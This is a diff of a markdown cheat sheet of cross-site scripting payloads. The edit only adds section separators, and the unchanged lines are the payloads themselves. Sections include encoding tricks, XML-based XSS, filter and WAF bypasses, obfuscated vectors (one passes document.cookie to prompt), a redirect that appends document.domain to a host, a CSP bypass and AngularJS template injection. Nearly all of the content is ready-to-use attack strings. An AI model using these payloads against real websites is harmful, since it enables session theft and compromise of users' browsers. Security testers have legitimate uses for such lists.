@@ -2,7 +2,7 @@
 
 ```https://xsshunter.com/```
 
-
+---
 > Encoding
 
 ```%u003Cscript%u003Eprompt%u0028303%u0029%u003C/script%u003E```
@@ -11,24 +11,24 @@
 
 ```%uff1cscript%uff1ealert(1);%uff1c/script%uff1e```
 
-
+---
 > XML Based XSS
 
 ```<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>```
 
 ```<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>```
 
-
+---
 > Where :// is required after protocol
 
 ```javascript://%250aalert(1) ```
 
-
+---
 > XSS in email ID
 
 ```"\"><s>test"@gmail.com```
 
-
+---
 > alert, prompt, confirm is not allowed
 
 ```this[Object["keys"](this)[6]](1)```
@@ -47,7 +47,7 @@
 
 ```([,?,,,,??]=[]+{},[???,????,?????,??????,,???????,????????,?????????,,,??????????]=[!!?]+!?+?.?)[??+=?+??????????+?????????+???+????+?????+??+???+?+????][??](???????+????????+??????+????+???+'`1`')```
 
-
+---
 > Simple bypasses
 
 ```<body onpageshow=alert(1)>```
@@ -78,7 +78,7 @@
 
 ```" onfocus=alert(1) autofocus```
 
-
+---
 > Obfuscated vectors
 
 ```<imG/sRc=l oNerrOr=(prompt)() x>```
@@ -95,7 +95,7 @@
 
 ```<A/iD=x hREf=jav&#x09;ascript:prom&#x09;pt(doc&#x09;ument.coo&#x09;kie); id=x>XSS```
 
-
+---
 > Exploit Codes
 
 ```Hidden Field data ~```
@@ -110,7 +110,7 @@
 
 ```javascript:void(a='//127.0.0.1');void(b=document.domain);void(c=a.concat(b));void(window.location.assign(c));```
 
-
+---
 > Javascript XSS
 
 ```data:,alert(1)```
@@ -125,22 +125,24 @@
 
 ```\'}alert(1);{//```
 
-
+---
 > CSP Bypassed
 
 ```<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1></script> <embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1)}//' allowscriptaccess=always>```
 
-
+---
 > Angular JS
 
 ```{{constructor.constructor('alert(1)')()}} ```
 
 ```<x ng-app>{{constructor.constructor('alert(1)')()}}```
 
+---
 > When Space and Slash doesnt work
 
 ```<svgonload=alert(1)>```
 
+---
 > Misc
 
 ```<script ~~~>confirm(1)</script ~~~>```
@@ -201,7 +203,8 @@
 
 ```<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>                            akamai ghost wafbypass```
 
-
+---
 > Reference
+
 ```https://research.digitalinterruption.com/2018/12/18/a-deeper-look-into-xss-payloads/```
 ```https://portswigger.net/web-security/cross-site-scripting/cheat-sheet```
